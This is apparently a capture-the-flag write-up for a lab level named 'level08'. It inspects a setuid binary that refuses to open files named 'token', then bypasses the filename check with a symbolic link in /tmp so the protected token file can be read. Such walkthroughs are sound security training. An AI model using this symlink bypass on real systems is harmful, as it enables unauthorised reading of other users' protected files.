@@ -1,0 +1,30 @@
+In your home, you get level08 and a token
+
+objdump -S -j .rodata level08
+	....%s [file to
+	read]..token.You
+	may not access
+	'%s'..Unable to
+	open %s.Unable t
+	o read fd %d.
+
+./level08
+	./level08 [file to read]
+
+./level08 token
+	You may not access 'token'
+
+./level08 level08 works fine
+
+ls -l
+
+-rwsr-s---+ 1 flag08 level08 8617 Mar 5 2016 level08
+-rw------- 1 flag08 flag08 26 Mar 5 2016 token
+
+Ok level08 can read the file token but refuse to read any file with name token.
+
+Just create a link :
+ln -s ~/token /tmp/hello
+
+Get the token :
+./level08 /tmp/hello
